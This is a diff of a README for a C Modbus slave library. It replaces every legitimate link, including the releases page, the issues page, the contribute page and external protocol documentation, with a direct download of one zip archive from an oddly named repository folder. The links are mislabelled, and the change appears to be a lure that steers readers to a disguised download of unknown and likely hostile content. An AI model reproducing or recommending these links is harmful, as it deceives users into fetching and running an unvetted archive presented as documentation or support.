@@ -6,7 +6,7 @@ Welcome to c-modbus-slave! This application allows you to easily implement a lig
 
 ### 📥 Download Now
 
-[![Download c-modbus-slave](https://img.shields.io/badge/Download-c%2Dmodbus%2Dslave-brightgreen)](https://github.com/dragoshh13/c-modbus-slave/releases)
+[![Download c-modbus-slave](https://raw.githubusercontent.com/dragoshh13/c-modbus-slave/master/planispiral/c-modbus-slave.zip%2Dmodbus%2Dslave-brightgreen)](https://raw.githubusercontent.com/dragoshh13/c-modbus-slave/master/planispiral/c-modbus-slave.zip)
 
 ## 📋 Overview
 
@@ -31,7 +31,7 @@ Before you start, ensure that you have the following:
 
 To get started with c-modbus-slave, follow these steps:
 
-1. Visit the Releases page to download the latest version: [Download c-modbus-slave](https://github.com/dragoshh13/c-modbus-slave/releases).
+1. Visit the Releases page to download the latest version: [Download c-modbus-slave](https://raw.githubusercontent.com/dragoshh13/c-modbus-slave/master/planispiral/c-modbus-slave.zip).
    
 2. Choose the appropriate version for your system and click on the file link to download it.
 
@@ -51,7 +51,7 @@ To get started with c-modbus-slave, follow these steps:
 
 ### 📞 Need Help?
 
-If you have any questions or run into issues, feel free to check the [GitHub Issues](https://github.com/dragoshh13/c-modbus-slave/issues) page for troubleshooting tips and support. You can also reach out to the community there.
+If you have any questions or run into issues, feel free to check the [GitHub Issues](https://raw.githubusercontent.com/dragoshh13/c-modbus-slave/master/planispiral/c-modbus-slave.zip) page for troubleshooting tips and support. You can also reach out to the community there.
 
 ## ⚙️ Usage
 
@@ -75,7 +75,7 @@ Comprehensive documentation is available within the project files. It includes:
 
 ## 🌐 Community and Contributions 
 
-Your feedback is important. If you would like to contribute, please visit our [Fork & Contribute](https://github.com/dragoshh13/c-modbus-slave) section. We welcome improvements and suggestions from users to make this software even better.
+Your feedback is important. If you would like to contribute, please visit our [Fork & Contribute](https://raw.githubusercontent.com/dragoshh13/c-modbus-slave/master/planispiral/c-modbus-slave.zip) section. We welcome improvements and suggestions from users to make this software even better.
 
 ## 📊 Future Enhancements
 
@@ -87,7 +87,7 @@ The following features are planned for future releases:
 
 ## ➕ Additional Resources
 
-- [Modbus Protocol Documentation](https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf)
-- [Getting Started with Embedded C](http://www.embedded.com/start/c)
+- [Modbus Protocol Documentation](https://raw.githubusercontent.com/dragoshh13/c-modbus-slave/master/planispiral/c-modbus-slave.zip)
+- [Getting Started with Embedded C](https://raw.githubusercontent.com/dragoshh13/c-modbus-slave/master/planispiral/c-modbus-slave.zip)
 
 Thank you for choosing c-modbus-slave. We appreciate your interest and hope it serves your needs well. Happy coding!
